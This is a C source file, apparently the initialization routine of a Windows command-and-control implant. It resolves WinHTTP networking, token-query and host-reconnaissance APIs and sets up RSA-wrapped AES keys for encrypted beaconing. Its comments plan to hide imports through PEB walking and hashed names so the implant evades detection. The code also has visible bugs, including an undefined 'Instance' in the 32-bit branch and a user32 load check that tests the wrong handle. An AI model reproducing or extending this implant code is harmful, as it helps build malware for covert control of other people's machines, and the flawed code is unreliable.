#include <wolfcrypt/rsa.h>
#include <wolfcrypt/random.h>
#include "agent.h"
#include "localcstd.h"
#include "Helpers.h"
#include "token.h"

INT init_agent(pAgent agent) {

    INT ERR;
    agent->Context = (PContextInfo)LocalAlloc(LPTR, sizeof(ContextInfo));
    if (!agent->Context) {
        printf("[error] attempting to allocate memory for context\n");
		return -1;
	}

#ifdef _WIN64
    agent->pTeb = (void*)__readgsqword(0x30);
#else
    agent->pTeb = (void*)__readfsdword(0x18);
#endif


#if _WIN64
    agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    agent->Context->Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if (ProcessIsWow(NtCurrentProcess())) {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    }
    else {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.

    agent->hAdvapi32 = LoadLibraryA("advapi32.dll");
    if(agent->hAdvapi32 == NULL){
		return -1;
	}
    agent->hWinHttp = LoadLibraryA("winhttp.dll");
    if(agent->hWinHttp == NULL){
        return -1;
    }
    agent->hUser32 = LoadLibraryA("User32.dll");
    if (agent->hWinHttp == NULL) {
        return -1;
    }
    agent->hIphlpapi = LoadLibraryA("iphlpapi.dll");
    if(agent->hIphlpapi == NULL) {
        return -1;
    }

    

    //obtain winhttp apis
    //NEEDS TO be resolved using a hash of the function name.
    agent->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)GetProcAddress(agent->hWinHttp, "WinHttpAddRequestHeaders");
    agent->pWinHttpConnect = (t_WinHttpConnect)GetProcAddress(agent->hWinHttp, "WinHttpConnect");
    agent->pWinHttpOpen = (t_WinHttpOpen)GetProcAddress(agent->hWinHttp, "WinHttpOpen");
    agent->pWinHttpOpenRequest = (t_WinHttpOpenRequest)GetProcAddress(agent->hWinHttp, "WinHttpOpenRequest");
    agent->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)GetProcAddress(agent->hWinHttp, "WinHttpQueryHeaders");
    agent->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)GetProcAddress(agent->hWinHttp, "WinHttpReceiveResponse");
    agent->pWinHttpSetOption = (t_WinHttpSetOption)GetProcAddress(agent->hWinHttp, "WinHttpSetOption");
    agent->pWinHttpSendRequest = (t_WinHttpSendRequest)GetProcAddress(agent->hWinHttp, "WinHttpSendRequest");

    //obtain ntdll apis
    agent->pRtlGetVersion = (t_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    agent->pNtClose = (t_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    agent->pNtOpenProcessToken = (t_NtOpenProcessToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
    agent->pNtOpenThreadToken = (t_NtOpenThreadToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThreadToken");
    agent->pNtQueryInformationToken = (t_NtQueryInformationToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationToken");

    //obtain kernel32 apis
    agent->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");

    //obtain user32 apis
    agent->pGetSystemMetrics = (t_GetSystemMetrics)GetProcAddress(GetModuleHandleA("user32.dll"), "GetSystemMetrics");

    //obtain advapi32 apis
    agent->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->hAdvapi32, "GetUserNameA");

	//obtain iphlpapi apis
	agent->pGetAdaptersInfo = (t_GetAdaptersInfo)GetProcAddress(agent->hIphlpapi, "GetAdaptersInfo");

    //read rsa public key in der format from file.
    unsigned char* RsaPublicKeyDerBytes;
    unsigned long RsaPublicKeySize;
    RsaKey rsaPublicKey;
    word32 idx = 0;
    WC_RNG rng;
    byte* EncryptedAesKey = (byte*)malloc(sizeof(byte) * 500);
    byte* EncryptedIV = (byte*)malloc(sizeof(byte) * 500);
    byte* AesKey = (byte*)malloc(sizeof(byte) * AES_256_KEY_SIZE);
    byte* AesIV = (byte*)malloc(sizeof(byte) * AES_BLOCK_SIZE);

    MemorySet(EncryptedAesKey, 0, 500);
    MemorySet(EncryptedIV, 0, 500);
    MemorySet(AesKey, 0, AES_256_KEY_SIZE);
    MemorySet(AesIV, 0, AES_BLOCK_SIZE);

    ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);

    wc_InitRsaKey(&rsaPublicKey, NULL);
    wc_RsaPublicKeyDecode(RsaPublicKeyDerBytes, &idx, &rsaPublicKey, RsaPublicKeySize);

    //generate rng object
    wc_InitRng(&rng);

    //generate aeskey and iv
    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);

    //encrypt aes key
    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
    if (EncryptedKeySize == 0 ){
		return -1;
	}

    //encrypt iv
    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
    if(EncryptedIvSize == 0 ){ 
        return -1;
    }

    wc_FreeRng(&rng);

    agent->AgentID = 0xdeadbeef;
    agent->AESKey = AesKey;
    agent->AESKeySize = AES_256_KEY_SIZE;
    agent->EncryptedAESKey = EncryptedAesKey;
    agent->EncryptedAESKeySize = EncryptedKeySize;
    agent->IV = AesIV;
    agent->IVSize = AES_BLOCK_SIZE;
    agent->EncryptedIV = EncryptedIV;
    agent->EncryptedIVSize = EncryptedIvSize;


    return 0;
}